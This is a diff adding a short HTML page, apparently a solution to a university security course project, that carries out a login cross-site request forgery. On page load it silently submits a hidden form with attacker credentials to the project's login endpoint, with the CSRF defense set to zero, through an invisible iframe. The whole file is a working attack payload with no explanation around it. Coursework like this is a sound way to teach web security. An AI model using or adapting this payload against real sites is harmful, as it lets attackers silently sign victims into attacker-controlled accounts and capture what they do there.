@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>csrf0</title>
+</head>
+<body onload="document.csrf0Form.submit()">
+    
+    <form action="https://comp427.rice.edu/proj2/login?csrfdefense=0&xssdefense=4" method="POST" target="hiddenFrame" name="csrf0Form">
+        <input id="username" name="username" type="hidden" value="attacker" required="">
+        <input id="userpass" name="password" type="hidden" value="3l33thax0rz!" required="">
+
+    </form>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+</body>
+</html>
